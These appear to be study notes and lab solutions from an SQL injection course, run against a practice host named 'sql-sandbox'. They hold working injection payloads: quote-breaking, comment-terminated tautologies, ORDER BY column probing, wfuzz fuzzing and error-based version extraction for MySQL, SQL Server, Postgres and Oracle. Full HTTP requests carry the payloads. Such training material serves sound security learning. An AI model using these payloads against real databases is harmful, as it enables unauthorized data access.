
###### SQL Injection


```
10 or id=11 -> MySQL, Oracle, SQL Server, PostgreSQL

```
String Delimiters

Injecting single quote

```
SELECT * FROM menu WHERE name = 'Tostadas''

```
Sol:

```
admin' or '1'='1

```

Closing Out Strings and Functions
Example payload:

```
foo') or id=11-- 
```

Payload becomes:

```
SELECT * FROM menu WHERE LOWER(name) = LOWER('foo') or id=11-- ') 

SELECT * FROM menu WHERE LOWER(name) LIKE LOWER('%foo') or id=11-- %')
```
Sol:
```
foo') or 1=1 --   Oracle
foo') or 1=1# MySQL
foo') or 1=1--  SQL Server
foo') or 1=1--  Postgres SQL
```

###### Sorting

Can be used to find no of columns.

```
SELECT name, price FROM menu ORDER BY name

SELECT name, price FROM menu ORDER BY 2

```
Sol:

```
POST /discovery/api/sorting HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/sorting
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 27
Connection: close

db=mysql&sort=id'&order=asc

```
MSSQL:

```
POST /discovery/api/sorting HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/sorting
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 27
Connection: close

db=mssql&sort=id;&order=asc
```

Used ; for mssql and postgres. ' for MySQL and Oracle.



###### Boundary Testing

```
SELECT * FROM menu ORDER BY 4 desc;

SELECT * FROM menu ORDER BY 5 desc; -> grnerates error as there is only 4 cols.

```


Sol:

```
POST /discovery/api/boundaries HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/boundaries
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 23
Connection: close

db=mysql&sort=5&order=2

```

###### Fuzzing

```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&id=FUZZ" -u http://sql-sandbox/api/intro

```
Sol:

postgres and mssql

```
POST /discovery/api/fuzzing HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/fuzzing
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 38
Connection: close

db=postgres&name=OR&sort=id&order=asc)

```

MySQL and oracle
```
POST /discovery/api/fuzzing HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/fuzzing
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 41
Connection: close

db=oracle&name=admin&sort=id&order=asc'
```



##### Exploiting SQL Injection

###### Error-based Payloads
force erroneous data type conversions

SQL Server

```
cast(@@version as integer)

```
Postgres SQL

```
cast(version() as integer)
```
MySQL

```
extractvalue('',concat('>',version()))
```
In this payload, we call the extractvalue() function and pass in a blank string as the first parameter (the XML fragment). For the second parameter, we use the concat() function to concatenate the greater-than symbol (>) and version(). We can use many different values for the first value in the concat() function as long as the resulting value is not a valid XPath expression. We want to avoid values that start with a forward slash (/), a period (.), the at character (@), or a completely alphanumeric string since these values would start a valid XPath expression. We are using the greater-than symbol (>) because it is a delimiter in XML and cannot be part of a valid XML node.


Oracle

```
to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
```

Sol:

```
POST /exploit/api/error HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/exploit/error
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 60
Connection: close

inStock=cast(@@version as integer)&name=as&sort=id&order=asc

```


1
(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver15 ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Null_(SQL) ↩︎

3
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html ↩︎

4
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_extractvalue ↩︎

5
(Wikipedia, 2021), https://en.wikipedia.org/wiki/XPath ↩︎

6
(Oracle, 2016), https://docs.oracle.com/database/121/ARPLS/d_xmlgen.htm#ARPLS69856 ↩︎

7
(Swissky, et al, 2021) https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md ↩︎

8
(NetSPI, 2019), https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql ↩︎


